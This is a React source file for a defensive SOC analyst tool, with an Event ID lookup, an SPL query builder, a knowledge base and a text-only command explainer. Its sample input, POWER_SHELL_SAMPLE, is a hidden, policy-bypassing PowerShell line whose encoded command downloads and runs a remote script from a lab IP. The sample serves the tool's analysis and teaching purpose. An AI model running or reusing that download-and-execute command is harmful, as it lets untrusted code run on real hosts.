import { useEffect, useState } from "react"
import {
  BookOpen,
  Clipboard,
  Database,
  FileSearch,
  Search,
  Send,
  TerminalSquare,
} from "lucide-react"
import { analyzePowerShell, analyzeWindowsEventText, listWindowsEvents, lookupWindowsEvent } from "../../api/backend"
import { WorkbenchHeader, WorkbenchPage } from "../../components/layout/WorkbenchShell"
import { KNOWLEDGE_CATEGORIES, searchKnowledgeBase } from "../../lib/localKnowledgeBase"
import {
  EVENT_QUICK_GROUPS,
  EVENT_MITRE_MAP,
  SPL_OBJECTIVES,
  analyzeCommandLocally,
  buildSplQuery,
  explainSplQuery,
} from "../../lib/socGuide/socGuideEngine"

function generateQuickReferenceSummary(entries = []) {
  const cats = {}
  for (const e of entries) {
    cats[e.category] = (cats[e.category] || 0) + 1
  }
  const lines = [
    "## SOC Quick Reference Summary",
    "",
    `**Total Entries:** ${entries.length}`,
    `**Categories:** ${Object.keys(cats).length}`,
    "",
    ...Object.entries(cats).sort((a, b) => b[1] - a[1]).map(([cat, count]) => `- **${cat}:** ${count} reference(s)`),
    "",
    "**Analyst Note:** This guide is a curated reference. Commands should be validated against your environment's approved tooling and change management policy before execution.",
  ]
  return lines.join("\n")
}

function copy(text) {
  navigator.clipboard?.writeText(String(text || ""))
}

function eventLabel(item) {
  return item.event_source === "Sysmon" ? `Sysmon ${item.event_id}` : item.event_id
}

function readPendingArtifact() {
  try {
    const raw = window.localStorage.getItem("beyondarch.pendingArtifact")
    return raw ? JSON.parse(raw) : null
  } catch {
    return null
  }
}

function clearPendingArtifact() {
  try {
    window.localStorage.removeItem("beyondarch.pendingArtifact")
  } catch {
    // ignore private storage failures
  }
}


function parsePendingArtifact() {
  const pending = readPendingArtifact()
  const text = pending?.content || pending?.value || pending?.text || pending?.query || ""
  if (!text) return { tab: "events", eventInput: "", commandInput: "", banner: null }
  const commandLike = /powershell|cmd\.exe|bash|curl|wget|sudo|EncodedCommand/i.test(text)
  return {
    tab: commandLike ? "commands" : "events",
    eventInput: commandLike ? "" : text,
    commandInput: commandLike ? text : "",
    banner: `Loaded from ${pending.source || "another BeyondArch tool"}`,
  }
}

function sendArtifact(setPage, target, artifact) {
  try {
    window.localStorage.setItem("beyondarch.pendingArtifact", JSON.stringify({ ...artifact, source: "SOC Guide", createdAt: new Date().toISOString() }))
  } catch {
    // localStorage is optional
  }
  setPage?.(target)
}

export default function SocGuidePage({ setPage }) {
  const [initialPending] = useState(() => parsePendingArtifact())
  const [tab, setTab] = useState(initialPending.tab)
  const [events, setEvents] = useState([])
  const [lookupInput, setLookupInput] = useState(initialPending.eventInput)
  const [lookupResult, setLookupResult] = useState(null)
  const [lookupError, setLookupError] = useState("")
  const [loading, setLoading] = useState(false)
  const [splConfig, setSplConfig] = useState({ ...SPL_OBJECTIVES[0].defaults, objective: SPL_OBJECTIVES[0].id })
  const [commandInput, setCommandInput] = useState(initialPending.commandInput)
  const [commandResult, setCommandResult] = useState(null)
  const [incomingBanner] = useState(initialPending.banner)

  useEffect(() => {
    listWindowsEvents()
      .then((data) => setEvents(Array.isArray(data) ? data : Array.isArray(data?.events) ? data.events : []))
      .catch(() => setEvents([]))
  }, [])

  useEffect(() => {
    if (initialPending.banner) clearPendingArtifact()
  }, [initialPending.banner])

  async function runLookup(id = lookupInput) {
    const value = String(id || "").trim()
    if (!value) return
    setLoading(true)
    setLookupError("")
    try {
      const looksLikePastedEvent = /\s|eventcode|event id|eventid|sysmon/i.test(value) && !/^(s\d+|sysmon[:\s-]?\d+|\d{3,5})$/i.test(value)
      const data = looksLikePastedEvent ? await analyzeWindowsEventText(value) : await lookupWindowsEvent(value)
      setLookupInput(value)
      setLookupResult(data)
    } catch (err) {
      setLookupError(err.message)
    } finally {
      setLoading(false)
    }
  }

  async function runCommandExplain() {
    if (!commandInput.trim()) return
    const local = analyzeCommandLocally(commandInput)
    setCommandResult({ local, powershell: null, error: "" })
    if (local.shell !== "PowerShell") return
    try {
      const powershell = await analyzePowerShell(commandInput)
      setCommandResult({ local, powershell, error: "" })
    } catch (err) {
      setCommandResult({ local, powershell: null, error: err.message })
    }
  }

  const selectedSpl = SPL_OBJECTIVES.find((item) => item.id === splConfig.objective) || SPL_OBJECTIVES[0]
  const generatedSpl = buildSplQuery(splConfig)
  const splExplanation = explainSplQuery(generatedSpl)

  return (
    <WorkbenchPage className="ba-guide-page">
      <WorkbenchHeader
        eyebrow="SOC Guide"
        title="SOC Analyst Playbook"
        subtitle="Identify Windows/Sysmon Event IDs, build SPL hunts, search the local knowledge base, and explain suspicious terminal or PowerShell commands."
        icon={BookOpen}
        chips={[{ label: "Event IDs", tone: "info" }, { label: "SPL", tone: "ready" }, { label: "Commands", tone: "warning" }, { label: "Knowledge base", tone: "local" }]}
      />

      {incomingBanner ? <div className="ba-guide-banner">{incomingBanner}</div> : null}

      <nav className="ba-guide-tabs">
        {[
          ["events", "Event ID Identifier", BookOpen],
          ["spl", "SPL Builder", Database],
          ["commands", "Command Explainer", TerminalSquare],
          ["knowledge", "Knowledge Base", Database],
        ].map(([id, label, Icon]) => (
          <button key={id} type="button" className={tab === id ? "is-active" : ""} onClick={() => setTab(id)}>
            <Icon className="h-4 w-4" />{label}
          </button>
        ))}
      </nav>

      {tab === "events" ? (
        <EventIdentifier
          events={events}
          lookupInput={lookupInput}
          setLookupInput={setLookupInput}
          lookupResult={lookupResult}
          lookupError={lookupError}
          loading={loading}
          onLookup={runLookup}
          setPage={setPage}
        />
      ) : null}

      {tab === "spl" ? (
        <SplBuilder
          config={splConfig}
          setConfig={setSplConfig}
          selected={selectedSpl}
          query={generatedSpl}
          explanation={splExplanation}
          setPage={setPage}
        />
      ) : null}

      {tab === "commands" ? (
        <CommandExplainer
          commandInput={commandInput}
          setCommandInput={setCommandInput}
          result={commandResult}
          onExplain={runCommandExplain}
          setPage={setPage}
        />
      ) : null}

      {tab === "knowledge" ? <LocalKnowledgeBase setPage={setPage} /> : null}
    </WorkbenchPage>
  )
}


function LocalKnowledgeBase({ setPage }) {
  const [query, setQuery] = useState("")
  const [category, setCategory] = useState("all")
  const [showSummary, setShowSummary] = useState(false)
  const entries = searchKnowledgeBase(query, category)
  const routeMap = {
    "Safe URL Analyzer": "safe-url-analyzer",
    "Recon & Exposure": "recon-exposure",
    "Logs & Alerts": "logs-alerts",
    "SIEM Workspace": "siem",
    "SOC Guide": "soc-guide",
    "Detection & MITRE": "detection-mitre",
    "Detection Workspace": "ids-builder",
    "Settings": "settings",
    "Case Timeline": "case-timeline",
    "Timeline": "case-timeline",
    "Report": "case-timeline",
    "Report Export": "case-timeline",
    "Query Builder": "logs-alerts",
  }
  return (
    <section className="ba-guide-layout ba-kb-layout">
      <div className="ba-guide-panel ba-guide-wide-card ba-kb-hero">
        <div className="ba-guide-card-copy">
          <h2>Local Knowledge Base</h2>
          <p>Quick SOC reference cards for phishing, URL analysis, auth/web logs, Windows Event IDs, detection rules, and local-first case handling.</p>
        </div>
        <div className="ba-kb-search-row">
          <input value={query} onChange={(event) => setQuery(event.target.value)} placeholder="Search phishing, 4625, URL, Sigma, storage…" />
          <select value={category} onChange={(event) => setCategory(event.target.value)}>{KNOWLEDGE_CATEGORIES.map((item) => <option key={item} value={item}>{item === "all" ? "All categories" : item}</option>)}</select>
        </div>
      </div>
      {entries.length ? (
        <div className="ba-guide-panel ba-guide-span-2">
          <div className="ba-guide-section-title">
            <h2>Reference Summary</h2>
            <span>{entries.length} entries across {Object.keys(entries.reduce((acc, e) => (acc[e.category] = true, acc), {})).length} categories</span>
          </div>
          <div className="ba-guide-button-row">
            <button type="button" onClick={() => setShowSummary(!showSummary)}>
              {showSummary ? "Hide Summary" : "Generate Summary"}
            </button>
          </div>
          {showSummary ? (
            <div className="ba-guide-code-card">
              <pre style={{whiteSpace: "pre-wrap", lineHeight: "1.5"}}>{generateQuickReferenceSummary(entries)}</pre>
              <div className="ba-guide-button-row">
                <button type="button" onClick={() => copy(generateQuickReferenceSummary(entries))}>
                  <Clipboard className="h-4 w-4" />Copy Summary
                </button>
              </div>
            </div>
          ) : null}
        </div>
      ) : null}
      <div className="ba-kb-grid ba-guide-span-2">
        {entries.map((entry) => (
          <article key={entry.id} className="ba-kb-card">
            <div className="ba-kb-card-head"><span>{entry.category}</span><strong>{entry.title}</strong></div>
            <p>{entry.summary}</p>
            <ul>{entry.steps.map((step) => <li key={step}>{step}</li>)}</ul>
            <div className="ba-kb-tags">{entry.tags.map((tag) => <span key={tag}>{tag}</span>)}</div>
            <div className="ba-kb-pivots">
              {entry.pivots.map((pivot) => routeMap[pivot] ? <button key={pivot} type="button" onClick={() => setPage?.(routeMap[pivot])}>{pivot}</button> : <span key={pivot}>{pivot}</span>)}
            </div>
          </article>
        ))}
      </div>
    </section>
  )
}

function SidebarQuickGroups({ onSelect, lookupInput }) {
  const [group, setGroup] = useState("")
  return (
    <section className="ba-guide-quick-groups">
      <h3>Quick event groups</h3>
      {EVENT_QUICK_GROUPS.map((g) => (
        <details key={g.id} open={group === g.id} onToggle={() => setGroup(group === g.id ? "" : g.id)}>
          <summary>{g.label}</summary>
          <div className="ba-guide-quick-ids">
            {g.ids.map((id) => (
              <button key={id} type="button" className={lookupInput === id ? "is-active" : ""} onClick={() => onSelect(id)}>{id}</button>
            ))}
          </div>
        </details>
      ))}
      <p className="ba-guide-subtle">Click an ID to look it up directly. Groups help you find related events fast.</p>
    </section>
  )
}

function EventIdentifier({
  events,
  lookupInput,
  setLookupInput,
  lookupResult,
  lookupError,
  loading,
  onLookup,
  setPage,
}) {
  const knownCount = events.length || 73
  function quickSelect(id) {
    setLookupInput(id)
    onLookup(id)
  }
  return (
    <section className="ba-guide-layout ba-guide-event-id-only">
      <div className="ba-guide-panel ba-guide-wide-card ba-guide-event-lookup">
        <div className="ba-guide-card-copy">
          <h2>Windows + Sysmon Event ID Identifier</h2>
          <p>Enter a Windows Event ID or Sysmon ID and get the analyst description, what it indicates, key fields, triage steps, related telemetry, MITRE ATT&CK mapping, and an SPL starter.</p>
          <div className="ba-guide-inline-help">
            <span>Windows: 4624, 4625, 4688, 7045</span>
            <span>Sysmon: sysmon:1, sysmon 7, s22</span>
            <span>{knownCount} local reference entries</span>
          </div>
        </div>
        <div className="ba-guide-lookup-box">
          <label>
            <span>Event ID</span>
            <input
              value={lookupInput}
              onChange={(event) => setLookupInput(event.target.value)}
              onKeyDown={(event) => { if (event.key === "Enter") onLookup() }}
              placeholder="4688, 7045, sysmon:1, sysmon 7…"
            />
          </label>
          <div className="ba-guide-button-row">
            <button type="button" onClick={() => onLookup()} disabled={loading}><Search className="h-4 w-4" />Identify ID</button>
            <button type="button" onClick={() => { setLookupInput("") }}>Clear</button>
          </div>
        </div>
        {lookupError ? <p className="ba-guide-error">{lookupError}</p> : null}
        <SidebarQuickGroups onSelect={quickSelect} lookupInput={lookupInput} />
      </div>

      <div className="ba-guide-panel ba-guide-span-2">
        <div className="ba-guide-section-title">
          <h2><BookOpen size={16} className="inline mr-1" />Event description</h2>
          <span>{lookupResult?.found ? eventLabel(lookupResult) : "lookup required"}</span>
        </div>
        {lookupResult ? <EventResult result={lookupResult} setPage={setPage} /> : <EmptyState title="No Event ID selected" body="Enter an Event ID above or pick from the quick groups to view the full BeyondArch local reference entry including MITRE ATT&CK mapping." />}
      </div>
    </section>
  )
}
function describeEvent(result) {
  if (result.full_description) return result.full_description
  const source = result.event_source || "Windows/Sysmon"
  const id = result.event_source === "Sysmon" ? `Sysmon Event ID ${result.event_id}` : `Windows Event ID ${result.event_id}`
  return `${id} is ${source} telemetry for ${String(result.title || "this activity").toLowerCase()}. ${result.why_it_matters || "Use it as supporting evidence and validate it with surrounding telemetry before making a conclusion."}`
}

function eventIndications(result) {
  const title = String(result.title || "event").toLowerCase()
  const category = String(result.category || "").toLowerCase()
  const generic = [`The activity described by ${eventLabel(result)} was recorded by ${result.event_source || "the endpoint"}.`, "It should be treated as investigation context, not proof of compromise by itself."]
  if (/failed|failure|authentication|logon/.test(title + category)) return ["Authentication activity occurred and should be reviewed for source, account, logon type, and timing.", "Repeated failures, unusual source hosts, or success after failures can indicate brute force, spraying, or credential misuse.", ...generic.slice(1)]
  if (/process|powershell|command|execution/.test(title + category)) return ["A process or command execution event was recorded.", "Parent process, command-line arguments, user context, path, and follow-on network/file activity determine whether it is suspicious.", ...generic.slice(1)]
  if (/service|task|persistence/.test(title + category)) return ["A persistence-capable Windows mechanism changed or executed.", "Unexpected service/task creation, unusual paths, or encoded/scripted payloads should be investigated.", ...generic.slice(1)]
  if (/privilege|account|group/.test(title + category)) return ["Account or privilege state changed.", "Validate who made the change, whether the target is privileged, and whether there is a matching approved request.", ...generic.slice(1)]
  if (/network|dns|connection/.test(title + category)) return ["Network-related telemetry was observed.", "Review destination, protocol, process association, frequency, and whether the destination is expected for the host/user.", ...generic.slice(1)]
  return generic
}


function MitreBadge({ mitre }) {
  if (!mitre) return null
  return <span className="ba-chip ba-chip-mitre">{mitre.id} {mitre.name}</span>
}

function EventResult({ result, setPage }) {
  if (result.events_found) {
    return (
      <div className="ba-guide-stack">
        {result.events_found.length ? result.events_found.map((event) => <EventResult key={event.lookup_key || event.event_id} result={event} setPage={setPage} />) : <EmptyState title="No known IDs found" body="The input did not match a Windows or Sysmon Event ID in the local BeyondArch reference." />}
      </div>
    )
  }
  if (!result.found) return <EmptyState title="No local entry found" body={result.message || "This Event ID is not in the local BeyondArch reference yet."} />
  const spl = result.sample_spl || `EventCode=${result.event_id} | table _time,host,user,EventCode,message`
  const eventKey = result.event_source === "Sysmon" ? `sysmon:${result.event_id.replace(/^sysmon[: -]?/i, "")}` : String(result.event_id)
  const mitreEntry = EVENT_MITRE_MAP[eventKey] || EVENT_MITRE_MAP[result.event_id] || null
  return (
    <div className="ba-guide-result">
      <section className="ba-guide-result-title">
        <h3>{result.event_source === "Sysmon" ? `Sysmon ${result.event_id}` : result.event_id} · {result.title}</h3>
        {mitreEntry ? <MitreBadge mitre={mitreEntry} /> : null}
        <p>{describeEvent(result)}</p>
      </section>
      {mitreEntry ? (
        <div className="ba-guide-mitre-card">
          <strong>MITRE ATT&CK</strong>
          <span>{mitreEntry.id}</span>
          <span>{mitreEntry.name}</span>
          <small>{mitreEntry.detail}</small>
        </div>
      ) : null}
      <div className="ba-guide-kv">
        <article><span>Source</span><strong>{result.event_source}</strong></article>
        <article><span>Category</span><strong>{result.category}</strong></article>
        <article><span>Severity hint</span><strong>{result.severity_hint}</strong></article>
        <article><span>Related telemetry</span><strong>{result.related_events?.join(", ") || "N/A"}</strong></article>
        <article className="ba-guide-span-2"><span>Fields to inspect</span><strong>{result.fields?.join(", ") || "N/A"}</strong></article>
      </div>
      <PanelBlock title="What it can indicate" items={eventIndications(result)} />
      <PanelBlock title="Triage steps" items={result.triage || []} />
      <details className="ba-guide-details">
        <summary>Benign explanations, related telemetry, and raw reference</summary>
        <PanelBlock title="Common benign explanations" items={result.false_positives || ["None documented yet."]} />
        <PanelBlock title="Related events to pivot into" items={result.related_events?.length ? result.related_events : ["No related events documented yet."]} />
        <pre>{JSON.stringify(result, null, 2)}</pre>
      </details>
      <div className="ba-guide-code-card">
        <div><strong>SPL starter</strong><small>Validate field names against your own Splunk data model.</small></div>
        <code>{spl}</code>
        <div className="ba-guide-button-row">
          <button type="button" onClick={() => copy(spl)}><Clipboard className="h-4 w-4" />Copy SPL</button>
          <button type="button" onClick={() => sendArtifact(setPage, "siem", { type: "spl-query", content: spl })}><Send className="h-4 w-4" />Send to SIEM</button>
          <button type="button" onClick={() => sendArtifact(setPage, "detection-mitre", { type: "event-reference", content: `${eventLabel(result)} ${result.title}\n${result.why_it_matters}` })}>Send to Detection</button>
        </div>
      </div>
    </div>
  )
}

function SplBuilder({ config, setConfig, selected, query, explanation, setPage }) {
  function update(key, value) {
    setConfig((current) => ({ ...current, [key]: value }))
  }
  function selectObjective(item) {
    setConfig({ ...item.defaults, objective: item.id })
  }
  return (
    <section className="ba-guide-layout ba-guide-spl">
      <div className="ba-guide-panel ba-guide-wide-card">
        <div className="ba-guide-card-copy">
          <h2>SPL Builder</h2>
          <p>Build a practical SPL starter the same way Detection Workspace drafts rules: choose the hunt objective, tune fields, review the explanation, then copy or send it to SIEM.</p>
        </div>
        <div className="ba-guide-controls">
          <label><span>Objective</span><select value={config.objective} onChange={(event) => selectObjective(SPL_OBJECTIVES.find((item) => item.id === event.target.value) || SPL_OBJECTIVES[0])}>{SPL_OBJECTIVES.map((item) => <option key={item.id} value={item.id}>{item.label}</option>)}</select></label>
          <button type="button" onClick={() => copy(query)}><Clipboard className="h-4 w-4" />Copy query</button>
          <button type="button" onClick={() => sendArtifact(setPage, "siem", { type: "spl-query", content: query })}><Send className="h-4 w-4" />Send to SIEM</button>
        </div>
      </div>

      <div className="ba-guide-panel">
        <h2>Hunt objectives</h2>
        <div className="ba-guide-objective-list">
          {SPL_OBJECTIVES.map((item) => (
            <button key={item.id} type="button" className={config.objective === item.id ? "is-active" : ""} onClick={() => selectObjective(item)}>
              <strong>{item.label}</strong>
              <small>{item.short}</small>
            </button>
          ))}
        </div>
      </div>

      <div className="ba-guide-panel">
        <h2>{selected.label}</h2>
        <p>{selected.short}</p>
        <div className="ba-guide-form-grid">
          <label><span>Index</span><input value={config.index} onChange={(event) => update("index", event.target.value)} placeholder="main" /></label>
          <label><span>Sourcetype</span><input value={config.sourcetype} onChange={(event) => update("sourcetype", event.target.value)} placeholder="WinEventLog:Security" /></label>
          <label><span>EventCode</span><input value={config.eventCode} onChange={(event) => update("eventCode", event.target.value)} placeholder="4688 or 4688 OR 1" /></label>
          <label><span>Keyword filter</span><input value={config.keyword} onChange={(event) => update("keyword", event.target.value)} placeholder="powershell OR EncodedCommand" /></label>
          <label><span>Field</span><input value={config.field} onChange={(event) => update("field", event.target.value)} placeholder="host, user, src_ip" /></label>
          <label><span>Value</span><input value={config.value} onChange={(event) => update("value", event.target.value)} placeholder="optional exact value" /></label>
        </div>
        <details className="ba-guide-details">
          <summary>Advanced SPL options</summary>
          <div className="ba-guide-form-grid mt-3">
            <label><span>Group by</span><input value={config.groupBy} onChange={(event) => update("groupBy", event.target.value)} placeholder="host,user" /></label>
            <label><span>Table fields</span><input value={config.tableFields} onChange={(event) => update("tableFields", event.target.value)} placeholder="_time,host,user,message" /></label>
            <label><span>Limit</span><input value={config.limit} onChange={(event) => update("limit", event.target.value)} placeholder="100" /></label>
            <label><span>Time window note</span><input value={config.time} onChange={(event) => update("time", event.target.value)} placeholder="24h" /></label>
          </div>
        </details>
      </div>

      <div className="ba-guide-panel ba-guide-span-2">
        <div className="ba-guide-section-title">
          <h2><Database size={16} className="inline mr-1" />Generated SPL</h2>
          <span>{selected.id}</span>
        </div>
        <code className="ba-guide-code">{query}</code>
        <div className="ba-guide-button-row">
          <button type="button" onClick={() => copy(query)}><Clipboard className="h-4 w-4" />Copy query</button>
          <button type="button" onClick={() => sendArtifact(setPage, "logs-alerts", { type: "spl-query", content: query })}>Send to Logs & Alerts</button>
          <button type="button" onClick={() => sendArtifact(setPage, "detection-mitre", { type: "hunt-query", content: query })}>Send to Detection</button>
        </div>
        <div className="ba-guide-explain-grid">
          {explanation.map((item) => <article key={`${item.title}-${item.detail}`}><strong>{item.title}</strong><small>{item.detail}</small></article>)}
        </div>
        <PanelBlock title="Analyst notes" items={selected.notes} />
      </div>
    </section>
  )
}

function CommandExplainer({ commandInput, setCommandInput, result, onExplain, setPage }) {
  const local = result?.local
  const ps = result?.powershell
  const decoded = ps?.decoded?.decoded || local?.decoded || ""
  const findings = ps?.findings || []
  return (
    <section className="ba-guide-layout">
      <div className="ba-guide-panel ba-guide-wide-card">
        <div className="ba-guide-card-copy">
          <h2>Command explainer</h2>
          <p>Paste PowerShell, Windows CMD, or Linux shell commands to get a rough explanation of what it is doing. BeyondArch analyzes text only and never executes commands.</p>
        </div>
        <div className="ba-guide-side-actions">
          <button type="button" onClick={onExplain}><Search className="h-4 w-4" />Explain command</button>
          <button type="button" onClick={() => setCommandInput(POWER_SHELL_SAMPLE)}>Load PowerShell sample</button>
          <button type="button" onClick={() => setCommandInput("")}>Clear</button>
        </div>
      </div>

      <div className="ba-guide-panel">
                  <h2><TerminalSquare size={16} className="inline mr-1" />Command input</h2>
        <textarea className="ba-guide-command-box" value={commandInput} onChange={(event) => setCommandInput(event.target.value)} placeholder="powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand ..." />
        <p className="ba-guide-subtle">Use this for terminal history, process command lines, EDR command-line fields, copied scripts, or suspicious one-liners.</p>
      </div>

      <div className="ba-guide-panel">
        <h2><Search size={16} className="inline mr-1" />Rough explanation</h2>
        {local ? (
          <div className="ba-guide-result">
            <section className="ba-guide-result-title"><h3>{local.shell}</h3><p>{local.summary}</p></section>
            <div className="ba-guide-kv">
              <article><span>URLs</span><strong>{local.artifacts.urls.length}</strong></article>
              <article><span>IPs</span><strong>{local.artifacts.ips.length}</strong></article>
              <article><span>Hashes</span><strong>{local.artifacts.hashes.length}</strong></article>
              <article><span>Backend PS decode</span><strong>{ps ? "available" : result?.error ? "failed" : "not needed"}</strong></article>
            </div>
            {findings.length ? <PanelBlock title="PowerShell analyzer findings" items={findings.map((item) => `${item.title}: ${item.detail}`)} /> : null}
            <PanelBlock title="Behavior markers" items={local.observations.length ? local.observations.map((item) => `${item.label} (${item.severity})${item.mitre ? ` [${item.mitre}]` : ""}: ${item.detail}`) : ["No obvious suspicious token identified by the local rough analyzer."]} />
            <PanelBlock title="Suggested next checks" items={local.nextSteps} />
            {decoded ? <div className="ba-guide-code-card"><div><strong>Decoded content</strong><small>Review decoded text before any other action.</small></div><code>{decoded}</code><div className="ba-guide-button-row"><button type="button" onClick={() => copy(decoded)}><Clipboard className="h-4 w-4" />Copy decoded</button><button type="button" onClick={() => sendArtifact(setPage, "cyberchef", { type: "decoded-command", content: decoded })}>Send to CyberChef</button></div></div> : null}
          </div>
        ) : <EmptyState title="No command explained" body="Paste a command and run the explainer to see shell type, behavior markers, decoded PowerShell content, indicators, and next triage steps." />}
      </div>

      {local ? (
        <div className="ba-guide-panel ba-guide-span-2">
          <div className="ba-guide-section-title"><h2><Database size={16} className="inline mr-1" />Artifacts and pivots</h2><span>text-only analysis</span></div>
          <div className="ba-guide-artifact-grid">
            <ArtifactList title="URLs" items={local.artifacts.urls} target="safe-url-analyzer" setPage={setPage} />
            <ArtifactList title="IPs" items={local.artifacts.ips} target="recon-exposure" setPage={setPage} />
            <ArtifactList title="Hashes" items={local.artifacts.hashes} target="attachment-triage" setPage={setPage} />
          </div>
          <div className="ba-guide-button-row">
            <button type="button" onClick={() => sendArtifact(setPage, "detection-mitre", { type: "command-analysis", content: commandInput })}>Send command to Detection</button>
            <button type="button" onClick={() => sendArtifact(setPage, "smart-parser", { type: "command-analysis", content: commandInput })}>Send to Smart Parser</button>
          </div>
        </div>
      ) : null}
    </section>
  )
}

function ArtifactList({ title, items, target, setPage }) {
  return (
    <article>
      <strong>{title}</strong>
      {items.length ? items.map((item) => <button key={item} type="button" onClick={() => sendArtifact(setPage, target, { type: title.toLowerCase(), content: item })}>{item}</button>) : <small>None found</small>}
    </article>
  )
}

function PanelBlock({ title, items }) {
  return (
    <section className="ba-guide-mini-panel">
      <h3>{title}</h3>
      <ul>{items.map((item) => <li key={item}>{item}</li>)}</ul>
    </section>
  )
}

function EmptyState({ title, body }) {
  return <div className="ba-guide-empty"><FileSearch size={22} className="text-zinc-500 mb-2" /><strong>{title}</strong><p>{body}</p></div>
}

const POWER_SHELL_SAMPLE = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADAALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
